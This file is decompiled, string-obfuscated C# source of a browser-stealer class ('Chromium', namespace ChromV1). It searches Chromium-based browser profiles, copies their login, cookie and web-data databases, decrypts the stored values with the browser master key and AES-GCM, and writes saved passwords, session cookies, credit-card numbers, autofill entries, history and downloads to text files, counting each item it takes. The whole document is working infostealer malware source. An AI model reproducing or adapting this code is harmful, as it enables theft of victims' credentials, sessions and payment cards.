using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using SmartAssembly.StringsEncoding;

namespace ChromV1
{
	// Token: 0x0200005A RID: 90
	public class Chromium
	{
		// Token: 0x060001F1 RID: 497 RVA: 0x0000E554 File Offset: 0x0000C754
		public static void Set(string hwid)
		{
			Chromium.bd = Path.GetTempPath() + Strings.Get(107396903) + hwid + Strings.Get(107396898);
			Chromium.ls = Path.GetTempPath() + Strings.Get(107396921) + hwid + Strings.Get(107396898);
			Console.ForegroundColor = ConsoleColor.Red;
			Console.WriteLine(Strings.Get(107396916));
			Console.WriteLine(Strings.Get(107396867));
			Console.WriteLine(Strings.Get(107396342));
			Console.WriteLine(Strings.Get(107396265));
			Console.WriteLine(Strings.Get(107396252));
			Console.WriteLine(Strings.Get(107396175));
			Console.WriteLine(Strings.Get(107396130));
		}

		// Token: 0x060001F2 RID: 498 RVA: 0x0000E620 File Offset: 0x0000C820
		public static void GetDownloads(string path2save)
		{
			try
			{
				List<string> list = new List<string>();
				List<string> list2 = new List<string>();
				list2.Add(Chromium.AppDate);
				list2.Add(Chromium.LocalData);
				List<string> list3 = new List<string>();
				foreach (string path in list2)
				{
					try
					{
						list3.AddRange(Directory.GetDirectories(path));
					}
					catch
					{
					}
				}
				foreach (string text in list3)
				{
					string[] array = null;
					try
					{
						list.AddRange(Directory.GetFiles(text, Strings.Get(107396117), SearchOption.AllDirectories));
						array = Directory.GetFiles(text, Strings.Get(107396117), SearchOption.AllDirectories);
					}
					catch
					{
					}
					if (array != null)
					{
						foreach (string text2 in array)
						{
							string text3 = Strings.Get(107396584);
							try
							{
								if (File.Exists(text2))
								{
									string str = Strings.Get(107396583) + text + Strings.Get(107396602);
									foreach (string text4 in Chromium.BrowsersName)
									{
										if (text.Contains(text4))
										{
											str = text4;
										}
									}
									string sourceFileName = text2;
									if (File.Exists(Chromium.bd))
									{
										File.Delete(Chromium.bd);
									}
									File.Copy(sourceFileName, Chromium.bd);
									SqlHandler sqlHandler = new SqlHandler(Chromium.bd);
									new List<PassData>();
									sqlHandler.ReadTable(Strings.Get(107396597));
									int rowCount = sqlHandler.GetRowCount();
									for (int k = 0; k < rowCount; k++)
									{
										try
										{
											string value = sqlHandler.GetValue(k, 3);
											string value2 = sqlHandler.GetValue(k, 15);
											text3 = string.Concat(new string[]
											{
												text3,
												Strings.Get(107396552),
												value2,
												Strings.Get(107396575),
												value,
												Strings.Get(107396562)
											});
											Chromium.Downloads++;
										}
										catch
										{
										}
									}
									if (File.Exists(Chromium.bd))
									{
										File.Delete(Chromium.bd);
									}
									if (File.Exists(Chromium.ls))
									{
										File.Delete(Chromium.ls);
									}
									File.AppendAllText(path2save + Strings.Get(107396485) + str + Strings.Get(107396500), text3);
								}
							}
							catch
							{
							}
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x060001F3 RID: 499 RVA: 0x0000E998 File Offset: 0x0000CB98
		public static void GetHistory(string path2save)
		{
			try
			{
				List<string> list = new List<string>();
				List<string> list2 = new List<string>();
				list2.Add(Chromium.AppDate);
				list2.Add(Chromium.LocalData);
				List<string> list3 = new List<string>();
				foreach (string path in list2)
				{
					try
					{
						list3.AddRange(Directory.GetDirectories(path));
					}
					catch
					{
					}
				}
				foreach (string text in list3)
				{
					string text2 = Strings.Get(107396584);
					string[] array = null;
					try
					{
						list.AddRange(Directory.GetFiles(text, Strings.Get(107396117), SearchOption.AllDirectories));
						array = Directory.GetFiles(text, Strings.Get(107396117), SearchOption.AllDirectories);
					}
					catch
					{
					}
					if (array != null)
					{
						foreach (string text3 in array)
						{
							try
							{
								if (File.Exists(text3))
								{
									string text4 = Strings.Get(107396459);
									foreach (string text5 in Chromium.BrowsersName)
									{
										if (text.Contains(text5))
										{
											text4 = text5;
										}
									}
									string sourceFileName = text3;
									if (File.Exists(Chromium.bd))
									{
										File.Delete(Chromium.bd);
									}
									File.Copy(sourceFileName, Chromium.bd);
									SqlHandler sqlHandler = new SqlHandler(Chromium.bd);
									new List<PassData>();
									sqlHandler.ReadTable(Strings.Get(107396478));
									int rowCount = sqlHandler.GetRowCount();
									for (int k = 0; k < rowCount; k++)
									{
										try
										{
											string value = sqlHandler.GetValue(k, 1);
											string value2 = sqlHandler.GetValue(k, 2);
											text2 = string.Concat(new string[]
											{
												text2,
												Strings.Get(107396469),
												value2,
												Strings.Get(107396424),
												value
											});
											Chromium.History++;
										}
										catch
										{
										}
									}
									if (File.Exists(Chromium.bd))
									{
										File.Delete(Chromium.bd);
									}
									if (File.Exists(Chromium.ls))
									{
										File.Delete(Chromium.ls);
									}
									if (text4 == Strings.Get(107396459))
									{
										File.AppendAllText(path2save + Strings.Get(107396443) + text4 + Strings.Get(107396500), text2, Encoding.Default);
									}
									else
									{
										File.AppendAllText(path2save + Strings.Get(107396443) + text4 + Strings.Get(107396500), text2, Encoding.Default);
									}
								}
							}
							catch
							{
							}
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x060001F4 RID: 500 RVA: 0x0000ED38 File Offset: 0x0000CF38
		public static void GetPasswordsOpera(string path2save)
		{
			try
			{
				List<string> list = new List<string>();
				List<string> list2 = new List<string>();
				list2.Add(Chromium.AppDate);
				list2.Add(Chromium.LocalData);
				List<string> list3 = new List<string>();
				foreach (string path in list2)
				{
					try
					{
						list3.AddRange(Directory.GetDirectories(path));
					}
					catch
					{
					}
				}
				foreach (string text in list3)
				{
					string[] array = null;
					string text2 = Strings.Get(107396584);
					try
					{
						list.AddRange(Directory.GetFiles(text, Strings.Get(107396398), SearchOption.AllDirectories));
						array = Directory.GetFiles(text, Strings.Get(107396398), SearchOption.AllDirectories);
					}
					catch
					{
					}
					if (array != null)
					{
						foreach (string text3 in array)
						{
							try
							{
								if (File.Exists(text3))
								{
									string text4 = Strings.Get(107396459);
									foreach (string text5 in Chromium.BrowsersName)
									{
										if (text.Contains(text5))
										{
											text4 = text5;
										}
									}
									string sourceFileName = text3;
									string sourceFileName2 = text3 + Strings.Get(107396413);
									if (File.Exists(Chromium.bd))
									{
										File.Delete(Chromium.bd);
									}
									if (File.Exists(Chromium.ls))
									{
										File.Delete(Chromium.ls);
									}
									File.Copy(sourceFileName, Chromium.bd);
									File.Copy(sourceFileName2, Chromium.ls);
									SqlHandler sqlHandler = new SqlHandler(Chromium.bd);
									new List<PassData>();
									sqlHandler.ReadTable(Strings.Get(107396360));
									string text6 = File.ReadAllText(Chromium.ls);
									string[] array4 = Regex.Split(text6, Strings.Get(107396383));
									int num = 0;
									string[] array3 = array4;
									for (int j = 0; j < array3.Length; j++)
									{
										if (array3[j] == Strings.Get(107396378))
										{
											text6 = array4[num + 2];
											break;
										}
										num++;
									}
									byte[] key = DecryptAPI.DecryptBrowsers(Encoding.Default.GetBytes(Encoding.Default.GetString(Convert.FromBase64String(text6)).Remove(0, 5)), null);
									int rowCount = sqlHandler.GetRowCount();
									for (int k = 0; k < rowCount; k++)
									{
										try
										{
											string value = sqlHandler.GetValue(k, 5);
											byte[] bytes = Encoding.Default.GetBytes(value);
											string str = Strings.Get(107396584);
											try
											{
												if (value.StartsWith(Strings.Get(107395813)) || value.StartsWith(Strings.Get(107395808)))
												{
													byte[] iv = bytes.Skip(3).Take(12).ToArray<byte>();
													str = AesGcm256.Decrypt(bytes.Skip(15).ToArray<byte>(), key, iv);
												}
												else
												{
													str = Encoding.Default.GetString(DecryptAPI.DecryptBrowsers(bytes, null));
												}
											}
											catch
											{
											}
											text2 = text2 + Strings.Get(107395835) + sqlHandler.GetValue(k, 1) + Strings.Get(107395826);
											text2 = text2 + Strings.Get(107395789) + sqlHandler.GetValue(k, 3) + Strings.Get(107395826);
											text2 = text2 + Strings.Get(107395776) + str + Strings.Get(107395826);
											text2 = text2 + Strings.Get(107395759) + text4 + Strings.Get(107395826);
											text2 += Strings.Get(107395746);
											Chromium.Passwords++;
										}
										catch
										{
										}
									}
									if (File.Exists(Chromium.bd))
									{
										File.Delete(Chromium.bd);
									}
									if (File.Exists(Chromium.ls))
									{
										File.Delete(Chromium.ls);
									}
									if (text4 == Strings.Get(107396459))
									{
										File.AppendAllText(path2save + Strings.Get(107395689) + text4 + Strings.Get(107396500), text2);
									}
									else
									{
										File.AppendAllText(path2save + Strings.Get(107395689) + text4 + Strings.Get(107396500), text2);
									}
								}
							}
							catch
							{
							}
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x060001F5 RID: 501 RVA: 0x0000F2B4 File Offset: 0x0000D4B4
		public static void GetPasswords(string path2save)
		{
			try
			{
				List<string> list = new List<string>();
				List<string> list2 = new List<string>();
				list2.Add(Chromium.AppDate);
				list2.Add(Chromium.LocalData);
				List<string> list3 = new List<string>();
				foreach (string path in list2)
				{
					try
					{
						list3.AddRange(Directory.GetDirectories(path));
					}
					catch
					{
					}
				}
				foreach (string text in list3)
				{
					string[] array = null;
					string text2 = Strings.Get(107396584);
					try
					{
						list.AddRange(Directory.GetFiles(text, Strings.Get(107396398), SearchOption.AllDirectories));
						array = Directory.GetFiles(text, Strings.Get(107396398), SearchOption.AllDirectories);
					}
					catch
					{
					}
					if (array != null)
					{
						foreach (string text3 in array)
						{
							try
							{
								if (File.Exists(text3))
								{
									string text4 = Strings.Get(107396459);
									foreach (string text5 in Chromium.BrowsersName)
									{
										if (text.Contains(text5))
										{
											text4 = text5;
										}
									}
									string sourceFileName = text3;
									string sourceFileName2 = text3 + Strings.Get(107395704);
									if (File.Exists(Chromium.bd))
									{
										File.Delete(Chromium.bd);
									}
									if (File.Exists(Chromium.ls))
									{
										File.Delete(Chromium.ls);
									}
									File.Copy(sourceFileName, Chromium.bd);
									File.Copy(sourceFileName2, Chromium.ls);
									SqlHandler sqlHandler = new SqlHandler(Chromium.bd);
									new List<PassData>();
									sqlHandler.ReadTable(Strings.Get(107396360));
									string text6 = File.ReadAllText(Chromium.ls);
									string[] array4 = Regex.Split(text6, Strings.Get(107396383));
									int num = 0;
									string[] array3 = array4;
									for (int j = 0; j < array3.Length; j++)
									{
										if (array3[j] == Strings.Get(107396378))
										{
											text6 = array4[num + 2];
											break;
										}
										num++;
									}
									byte[] key = DecryptAPI.DecryptBrowsers(Encoding.Default.GetBytes(Encoding.Default.GetString(Convert.FromBase64String(text6)).Remove(0, 5)), null);
									int rowCount = sqlHandler.GetRowCount();
									for (int k = 0; k < rowCount; k++)
									{
										try
										{
											string value = sqlHandler.GetValue(k, 5);
											byte[] bytes = Encoding.Default.GetBytes(value);
											string str = Strings.Get(107396584);
											try
											{
												if (value.StartsWith(Strings.Get(107395813)) || value.StartsWith(Strings.Get(107395808)))
												{
													byte[] iv = bytes.Skip(3).Take(12).ToArray<byte>();
													str = AesGcm256.Decrypt(bytes.Skip(15).ToArray<byte>(), key, iv);
												}
												else
												{
													str = Encoding.Default.GetString(DecryptAPI.DecryptBrowsers(bytes, null));
												}
											}
											catch
											{
											}
											text2 = text2 + Strings.Get(107395835) + sqlHandler.GetValue(k, 1) + Strings.Get(107395826);
											text2 = text2 + Strings.Get(107395789) + sqlHandler.GetValue(k, 3) + Strings.Get(107395826);
											text2 = text2 + Strings.Get(107395679) + str + Strings.Get(107395826);
											text2 = text2 + Strings.Get(107395759) + text4 + Strings.Get(107395826);
											text2 += Strings.Get(107395746);
											Chromium.Passwords++;
										}
										catch
										{
										}
									}
									if (File.Exists(Chromium.bd))
									{
										File.Delete(Chromium.bd);
									}
									if (File.Exists(Chromium.ls))
									{
										File.Delete(Chromium.ls);
									}
									if (text4 == Strings.Get(107396459))
									{
										File.AppendAllText(path2save + Strings.Get(107395689) + text4 + Strings.Get(107396500), text2);
									}
									else
									{
										File.AppendAllText(path2save + Strings.Get(107395689) + text4 + Strings.Get(107396500), text2);
									}
								}
							}
							catch
							{
							}
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x060001F6 RID: 502 RVA: 0x0000F830 File Offset: 0x0000DA30
		public static void GetCookiesOpera(string path2save)
		{
			try
			{
				List<string> list = new List<string>();
				List<string> list2 = new List<string>();
				list2.Add(Chromium.AppDate);
				list2.Add(Chromium.LocalData);
				List<string> list3 = new List<string>();
				foreach (string path in list2)
				{
					try
					{
						list3.AddRange(Directory.GetDirectories(path));
					}
					catch
					{
					}
				}
				foreach (string text in list3)
				{
					string text2 = Strings.Get(107396584);
					string[] array = null;
					try
					{
						list.AddRange(Directory.GetFiles(text, Strings.Get(107395630), SearchOption.AllDirectories));
						array = Directory.GetFiles(text, Strings.Get(107395630), SearchOption.AllDirectories);
					}
					catch
					{
					}
					if (array != null)
					{
						foreach (string text3 in array)
						{
							try
							{
								if (File.Exists(text3))
								{
									string text4 = Strings.Get(107396459);
									foreach (string text5 in Chromium.BrowsersName)
									{
										if (text.Contains(text5))
										{
											text4 = text5;
										}
									}
									string sourceFileName = text3;
									string sourceFileName2 = text3 + Strings.Get(107396413);
									if (File.Exists(Chromium.bd))
									{
										File.Delete(Chromium.bd);
									}
									if (File.Exists(Chromium.ls))
									{
										File.Delete(Chromium.ls);
									}
									File.Copy(sourceFileName, Chromium.bd);
									File.Copy(sourceFileName2, Chromium.ls);
									SqlHandler sqlHandler = new SqlHandler(Chromium.bd);
									new List<PassData>();
									sqlHandler.ReadTable(Strings.Get(107395617));
									string text6 = File.ReadAllText(Chromium.ls);
									string[] array4 = Regex.Split(text6, Strings.Get(107396383));
									int num = 0;
									string[] array3 = array4;
									for (int j = 0; j < array3.Length; j++)
									{
										if (array3[j] == Strings.Get(107396378))
										{
											text6 = array4[num + 2];
											break;
										}
										num++;
									}
									byte[] key = DecryptAPI.DecryptBrowsers(Encoding.Default.GetBytes(Encoding.Default.GetString(Convert.FromBase64String(text6)).Remove(0, 5)), null);
									int rowCount = sqlHandler.GetRowCount();
									for (int k = 0; k < rowCount; k++)
									{
										try
										{
											string value = sqlHandler.GetValue(k, 12);
											byte[] bytes = Encoding.Default.GetBytes(value);
											string text7 = Strings.Get(107396584);
											try
											{
												if (value.StartsWith(Strings.Get(107395813)))
												{
													byte[] iv = bytes.Skip(3).Take(12).ToArray<byte>();
													text7 = AesGcm256.Decrypt(bytes.Skip(15).ToArray<byte>(), key, iv);
												}
												else
												{
													text7 = Encoding.Default.GetString(DecryptAPI.DecryptBrowsers(bytes, null));
												}
												string value2 = sqlHandler.GetValue(k, 1);
												string value3 = sqlHandler.GetValue(k, 2);
												string value4 = sqlHandler.GetValue(k, 4);
												string value5 = sqlHandler.GetValue(k, 5);
												string value6 = sqlHandler.GetValue(k, 6);
												text2 = string.Concat(new string[]
												{
													text2,
													value2,
													Strings.Get(107395636),
													value4,
													Strings.Get(107395591),
													value6.ToUpper(),
													Strings.Get(107395591),
													value5,
													Strings.Get(107395591),
													value3,
													Strings.Get(107395591),
													text7,
													Strings.Get(107395826)
												});
												Chromium.Cookies++;
											}
											catch
											{
											}
										}
										catch
										{
										}
									}
									if (File.Exists(Chromium.bd))
									{
										File.Delete(Chromium.bd);
									}
									if (File.Exists(Chromium.ls))
									{
										File.Delete(Chromium.ls);
									}
									if (text4 == Strings.Get(107396459))
									{
										File.AppendAllText(path2save + Strings.Get(107395586) + text4 + Strings.Get(107396500), text2);
									}
									else
									{
										File.AppendAllText(path2save + Strings.Get(107395586) + text4 + Strings.Get(107396500), text2);
									}
								}
							}
							catch
							{
							}
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x060001F7 RID: 503 RVA: 0x0000FDBC File Offset: 0x0000DFBC
		public static void GetCookies(string path2save)
		{
			try
			{
				List<string> list = new List<string>();
				List<string> list2 = new List<string>();
				list2.Add(Chromium.AppDate);
				list2.Add(Chromium.LocalData);
				List<string> list3 = new List<string>();
				foreach (string path in list2)
				{
					try
					{
						list3.AddRange(Directory.GetDirectories(path));
					}
					catch
					{
					}
				}
				foreach (string text in list3)
				{
					string text2 = Strings.Get(107396584);
					string[] array = null;
					try
					{
						list.AddRange(Directory.GetFiles(text, Strings.Get(107395630), SearchOption.AllDirectories));
						array = Directory.GetFiles(text, Strings.Get(107395630), SearchOption.AllDirectories);
					}
					catch
					{
					}
					if (array != null)
					{
						foreach (string text3 in array)
						{
							try
							{
								if (File.Exists(text3))
								{
									string text4 = Strings.Get(107396459);
									foreach (string text5 in Chromium.BrowsersName)
									{
										if (text.Contains(text5))
										{
											text4 = text5;
										}
									}
									string sourceFileName = text3;
									string sourceFileName2 = text3 + Strings.Get(107395704);
									if (File.Exists(Chromium.bd))
									{
										File.Delete(Chromium.bd);
									}
									if (File.Exists(Chromium.ls))
									{
										File.Delete(Chromium.ls);
									}
									File.Copy(sourceFileName, Chromium.bd);
									File.Copy(sourceFileName2, Chromium.ls);
									SqlHandler sqlHandler = new SqlHandler(Chromium.bd);
									new List<PassData>();
									sqlHandler.ReadTable(Strings.Get(107395617));
									string text6 = File.ReadAllText(Chromium.ls);
									string[] array4 = Regex.Split(text6, Strings.Get(107396383));
									int num = 0;
									string[] array3 = array4;
									for (int j = 0; j < array3.Length; j++)
									{
										if (array3[j] == Strings.Get(107396378))
										{
											text6 = array4[num + 2];
											break;
										}
										num++;
									}
									byte[] key = DecryptAPI.DecryptBrowsers(Encoding.Default.GetBytes(Encoding.Default.GetString(Convert.FromBase64String(text6)).Remove(0, 5)), null);
									int rowCount = sqlHandler.GetRowCount();
									for (int k = 0; k < rowCount; k++)
									{
										try
										{
											string value = sqlHandler.GetValue(k, 12);
											byte[] bytes = Encoding.Default.GetBytes(value);
											string text7 = Strings.Get(107396584);
											try
											{
												if (value.StartsWith(Strings.Get(107395813)))
												{
													byte[] iv = bytes.Skip(3).Take(12).ToArray<byte>();
													text7 = AesGcm256.Decrypt(bytes.Skip(15).ToArray<byte>(), key, iv);
												}
												else
												{
													text7 = Encoding.Default.GetString(DecryptAPI.DecryptBrowsers(bytes, null));
												}
												string value2 = sqlHandler.GetValue(k, 1);
												string value3 = sqlHandler.GetValue(k, 2);
												string value4 = sqlHandler.GetValue(k, 4);
												string value5 = sqlHandler.GetValue(k, 5);
												string value6 = sqlHandler.GetValue(k, 6);
												text2 = string.Concat(new string[]
												{
													text2,
													value2,
													Strings.Get(107395636),
													value4,
													Strings.Get(107395591),
													value6.ToUpper(),
													Strings.Get(107395591),
													value5,
													Strings.Get(107395591),
													value3,
													Strings.Get(107395591),
													text7,
													Strings.Get(107395826)
												});
												Chromium.Cookies++;
											}
											catch
											{
											}
										}
										catch
										{
										}
									}
									if (File.Exists(Chromium.bd))
									{
										File.Delete(Chromium.bd);
									}
									if (File.Exists(Chromium.ls))
									{
										File.Delete(Chromium.ls);
									}
									if (text4 == Strings.Get(107396459))
									{
										File.AppendAllText(path2save + Strings.Get(107395586) + text4 + Strings.Get(107396500), text2);
									}
									else
									{
										File.AppendAllText(path2save + Strings.Get(107395586) + text4 + Strings.Get(107396500), text2);
									}
								}
							}
							catch
							{
							}
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x060001F8 RID: 504 RVA: 0x00010348 File Offset: 0x0000E548
		public static void GetCards(string path2save)
		{
			try
			{
				List<string> list = new List<string>();
				List<string> list2 = new List<string>();
				list2.Add(Chromium.AppDate);
				list2.Add(Chromium.LocalData);
				List<string> list3 = new List<string>();
				foreach (string path in list2)
				{
					try
					{
						list3.AddRange(Directory.GetDirectories(path));
					}
					catch
					{
					}
				}
				foreach (string text in list3)
				{
					string text2 = Strings.Get(107396584);
					string[] array = null;
					try
					{
						list.AddRange(Directory.GetFiles(text, Strings.Get(107395605), SearchOption.AllDirectories));
						array = Directory.GetFiles(text, Strings.Get(107395605), SearchOption.AllDirectories);
					}
					catch
					{
					}
					if (array != null)
					{
						foreach (string text3 in array)
						{
							try
							{
								if (File.Exists(text3))
								{
									string text4 = Strings.Get(107396459);
									foreach (string text5 in Chromium.BrowsersName)
									{
										if (text.Contains(text5))
										{
											text4 = text5;
										}
									}
									string sourceFileName = text3;
									if (File.Exists(Chromium.bd))
									{
										File.Delete(Chromium.bd);
									}
									File.Copy(sourceFileName, Chromium.bd);
									SqlHandler sqlHandler = new SqlHandler(Chromium.bd);
									new List<PassData>();
									sqlHandler.ReadTable(Strings.Get(107396072));
									int rowCount = sqlHandler.GetRowCount();
									for (int k = 0; k < rowCount; k++)
									{
										try
										{
											string @string = Encoding.UTF8.GetString(DecryptAPI.DecryptBrowsers(Encoding.Default.GetBytes(sqlHandler.GetValue(k, 4)), null));
											string value = sqlHandler.GetValue(k, 1);
											string value2 = sqlHandler.GetValue(k, 2);
											string value3 = sqlHandler.GetValue(k, 3);
											string value4 = sqlHandler.GetValue(k, 9);
											text2 = string.Concat(new string[]
											{
												text2,
												value,
												Strings.Get(107395591),
												value2,
												Strings.Get(107396087),
												value3,
												Strings.Get(107395591),
												@string,
												Strings.Get(107395591),
												value4,
												Strings.Get(107396082)
											});
											Chromium.CC++;
										}
										catch
										{
										}
									}
									if (File.Exists(Chromium.bd))
									{
										File.Delete(Chromium.bd);
									}
									if (File.Exists(Chromium.ls))
									{
										File.Delete(Chromium.ls);
									}
									if (text4 == Strings.Get(107396459))
									{
										File.AppendAllText(path2save + Strings.Get(107396001) + text4 + Strings.Get(107396500), text2);
									}
									else
									{
										File.AppendAllText(path2save + Strings.Get(107396001) + text4 + Strings.Get(107396500), text2);
									}
								}
							}
							catch
							{
							}
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x060001F9 RID: 505 RVA: 0x0001075C File Offset: 0x0000E95C
		public static void GetAutofills(string path2save)
		{
			try
			{
				List<string> list = new List<string>();
				List<string> list2 = new List<string>();
				list2.Add(Chromium.AppDate);
				list2.Add(Chromium.LocalData);
				List<string> list3 = new List<string>();
				foreach (string path in list2)
				{
					try
					{
						list3.AddRange(Directory.GetDirectories(path));
					}
					catch
					{
					}
				}
				foreach (string text in list3)
				{
					string text2 = Strings.Get(107396584);
					string[] array = null;
					try
					{
						list.AddRange(Directory.GetFiles(text, Strings.Get(107395605), SearchOption.AllDirectories));
						array = Directory.GetFiles(text, Strings.Get(107395605), SearchOption.AllDirectories);
					}
					catch
					{
					}
					if (array != null)
					{
						foreach (string text3 in array)
						{
							try
							{
								if (File.Exists(text3))
								{
									string text4 = Strings.Get(107396459);
									foreach (string text5 in Chromium.BrowsersName)
									{
										if (text.Contains(text5))
										{
											text4 = text5;
										}
									}
									string sourceFileName = text3;
									if (File.Exists(Chromium.bd))
									{
										File.Delete(Chromium.bd);
									}
									File.Copy(sourceFileName, Chromium.bd);
									SqlHandler sqlHandler = new SqlHandler(Chromium.bd);
									new List<PassData>();
									sqlHandler.ReadTable(Strings.Get(107396020));
									int rowCount = sqlHandler.GetRowCount();
									for (int k = 0; k < rowCount; k++)
									{
										try
										{
											string value = sqlHandler.GetValue(k, 0);
											string value2 = sqlHandler.GetValue(k, 1);
											text2 = string.Concat(new string[]
											{
												text2,
												Strings.Get(107395975),
												value,
												Strings.Get(107395998),
												value2,
												Strings.Get(107396562)
											});
											Chromium.Autofills++;
										}
										catch
										{
										}
									}
									if (File.Exists(Chromium.bd))
									{
										File.Delete(Chromium.bd);
									}
									if (File.Exists(Chromium.ls))
									{
										File.Delete(Chromium.ls);
									}
									if (text4 == Strings.Get(107396459))
									{
										File.AppendAllText(path2save + Strings.Get(107395985) + text4 + Strings.Get(107396500), text2);
									}
									else
									{
										File.AppendAllText(path2save + Strings.Get(107395985) + text4 + Strings.Get(107396500), text2);
									}
								}
							}
							catch
							{
							}
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x040000C7 RID: 199
		public static int Passwords;

		// Token: 0x040000C8 RID: 200
		public static int Autofills;

		// Token: 0x040000C9 RID: 201
		public static int Downloads;

		// Token: 0x040000CA RID: 202
		public static int Cookies;

		// Token: 0x040000CB RID: 203
		public static int History;

		// Token: 0x040000CC RID: 204
		public static int CC;

		// Token: 0x040000CD RID: 205
		public static readonly string LocalData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

		// Token: 0x040000CE RID: 206
		public static readonly string AppDate = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

		// Token: 0x040000CF RID: 207
		public static string bd;

		// Token: 0x040000D0 RID: 208
		public static string ls;

		// Token: 0x040000D1 RID: 209
		private static readonly string[] BrowsersName = new string[]
		{
			Strings.Get(107395936),
			Strings.Get(107395959),
			Strings.Get(107395918),
			Strings.Get(107395909),
			Strings.Get(107395928),
			Strings.Get(107395887),
			Strings.Get(107395878),
			Strings.Get(107395901),
			Strings.Get(107395892),
			Strings.Get(107395843),
			Strings.Get(107395870),
			Strings.Get(107395857),
			Strings.Get(107395300),
			Strings.Get(107395319),
			Strings.Get(107395270),
			Strings.Get(107395289),
			Strings.Get(107395244),
			Strings.Get(107395263),
			Strings.Get(107395214),
			Strings.Get(107395229),
			Strings.Get(107395180),
			Strings.Get(107395199),
			Strings.Get(107395190),
			Strings.Get(107395145),
			Strings.Get(107395160),
			Strings.Get(107395107),
			Strings.Get(107395130)
		};
	}
}
